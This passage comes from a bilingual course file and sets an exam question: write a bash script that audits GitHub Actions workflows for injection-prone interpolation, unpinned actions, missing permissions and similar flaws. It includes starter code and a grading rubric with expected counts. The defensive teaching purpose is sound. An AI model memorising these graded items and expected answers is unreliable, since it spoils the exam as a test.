            '<p>Two things are graded beyond the counts. The script must <b>fail loudly</b>: no <code>|| true</code>, no <code>|| sleep</code>, and a non-zero exit when anything warns. And you must run it twice — once against the broken directory this exam supplies, and once against a real repository\'s workflows — because a check you have never seen go red is a check you have not tested.</p>',

            '<p><b>Câu 5 — Một script tìm ra đúng những khuyết tật khoá này đã đo (chương 8 và 10).</b> Bài 10.3 ghi lại một smoke test không phát khói nổi: nó gọi <code>wget</code> bên trong một container cố ý không cài cả <code>wget</code> lẫn <code>curl</code>, cú hỏng của nó bị một <code>|| sleep 5</code> nuốt mất, và nó đốt khoảng 25 giây mỗi lần deploy suốt nhiều tuần mà không bắt nổi thứ gì. Một phép kiểm KHÔNG THỂ hỏng thì không phải một phép kiểm.</p>' +
            '<p>Hãy viết <code>Q5/soat.sh</code>, nhận một thư mục workflow làm <code>$1</code> và mặc định là <code>.github/workflows</code>. Nó phải in một dòng cho mỗi phép kiểm và thoát khác 0 nếu có bất kỳ phép kiểm nào cảnh báo. Bảy phép kiểm, mỗi cái ứng với một cú hỏng đã ĐO được trong khoá này:</p>' +
            '<ol>' +
            '<li>một biểu thức sự kiện nội suy trong thân <code>run:</code> — cú tiêm ba dòng ở chương 3;</li>' +
            '<li>workflow nào dùng <code>pull_request_target</code>;</li>' +
            '<li>action nào ghim vào một NHÁNH thay vì một thẻ hay một SHA;</li>' +
            '<li>tỉ lệ ghim SHA, in dưới dạng <code>&lt;đã ghim&gt; / &lt;tổng&gt;</code>;</li>' +
            '<li>bao nhiêu workflow khai <code>permissions:</code>, trên tổng bao nhiêu tệp;</li>' +
            '<li>một <code>if: \'false\'</code> có nháy, tức điều kiện hỏng theo hướng MỞ;</li>' +
            '<li>một khoá cache không có <code>hashFiles</code>, thứ đông cứng ở lần chạy một.</li>' +
            '</ol>' +
            '<p>Rồi in ra, dưới dạng THÔNG TIN chứ không phải cảnh báo, số lượt tham chiếu <code>secrets.*</code>. <b>Hãy đếm SỐ LẦN, không đếm SỐ DÒNG</b> — chính script soát của bài 6.5 đã lệch chín ở chỗ này, và chín ấy là chín bản chép của một khối SSH mà dòng <code>printf</code> của nó nêu tới hai bí mật.</p>' +
            '<p>Có hai thứ bị chấm ngoài các con số. Script phải <b>hỏng TO TIẾNG</b>: không <code>|| true</code>, không <code>|| sleep</code>, và thoát khác 0 khi có bất cứ cảnh báo nào. Và bạn phải chạy nó HAI lượt — một lượt trên thư mục hỏng mà đề cung cấp, một lượt trên các workflow của một kho thật — vì một phép kiểm bạn chưa từng thấy chuyển đỏ là một phép kiểm bạn chưa hề thử.</p>',
          ),
          starterCode:
            '# ── ĐỀ CHO SẴN — KHÔNG SỬA ─────────────────────────────────────────────\n' +
            '# Q5/soat.sh\n' +
            '# Chay:  bash Q5/soat.sh Q5/hong            (thu muc HONG de cho san)\n' +
            '#        bash Q5/soat.sh .github/workflows  (mot kho THAT)\n' +
            '# Ca hai luot deu phai co trong bai nop, va luot dau BAT BUOC ra\n' +
            '# canh bao — mot phep kiem chua tung do la mot phep kiem chua thu.\n' +
            '\n' +
            '# ── VIẾT LỜI GIẢI CỦA BẠN Ở ĐÂY ────────────────────────────────────────\n' +
            '\n' +
            '\n' +
            '# ── ĐỀ CHO SẴN — KHÔNG SỬA ─────────────────────────────────────────────\n' +
            '# Chay dung nhung cau lenh trong khoi "ket qua mong doi" roi doi chieu\n' +
            '# tung dong mot truoc khi nop.\n',
          expectedOutput: Q5_OUTPUT,
          sampleSolution: Q5_SOLUTION,
          rubric: rubric([
            ['baykiem',
              'All seven checks are implemented and each produces the counts printed in the expected output on both directories — in particular the broken directory reports the branch pin, the quoted <code>if: \'false\'</code>, the hashless cache key and the event interpolation.',
              'Đủ cả bảy phép kiểm và mỗi cái cho ra đúng những con số in trong kết quả mong đợi trên CẢ HAI thư mục — cụ thể là thư mục hỏng phải báo ra cái ghim nhánh, cái <code>if: \'false\'</code> có nháy, cái khoá cache không hash, và cú nội suy sự kiện.',
              0.6],
            ['demlan',
              'The <code>secrets.*</code> tally counts OCCURRENCES rather than lines — <code>grep -o … | wc -l</code>, not <code>grep -c</code> — and reports 44 on the real repository, matching the hand count that the original audit script missed by nine.',
              'Phép đếm <code>secrets.*</code> đếm SỐ LẦN chứ không đếm SỐ DÒNG — <code>grep -o … | wc -l</code> chứ không phải <code>grep -c</code> — và báo ra 44 trên kho thật, khớp với phép đếm tay mà script soát ban đầu đã hụt mất chín.',
              0.5],
            ['hongto',
              'The script exits non-zero when any check warns, contains no <code>|| true</code> or <code>|| sleep</code> anywhere, and prints a line for the checks that PASS as well — a check with no output when it works is a check nobody notices when it stops working.',
              'Script thoát khác 0 khi có bất kỳ phép kiểm nào cảnh báo, không chứa <code>|| true</code> hay <code>|| sleep</code> ở đâu cả, và in ra một dòng cho cả những phép kiểm ĐẠT — một phép kiểm im lặng lúc nó chạy được là một phép kiểm chẳng ai nhận ra khi nó thôi chạy.',
              0.5],
            ['thuthat',
              'Both runs are in the submission with their exit codes, the broken directory genuinely produces warnings, and the real directory reproduces the two ambers this repository actually has — 0 of 21 SHA pins and 1 of 11 <code>permissions:</code> blocks.',
              'Cả hai lượt chạy đều có trong bài nộp kèm mã thoát, thư mục hỏng thật sự đẻ ra cảnh báo, và thư mục thật tái lập đúng hai vạch vàng mà kho này đang có — 0 trên 21 lượt ghim SHA và 1 trên 11 khối <code>permissions:</code>.',
              0.4],
          ]),
        }),

      ],
    },
  ],
};
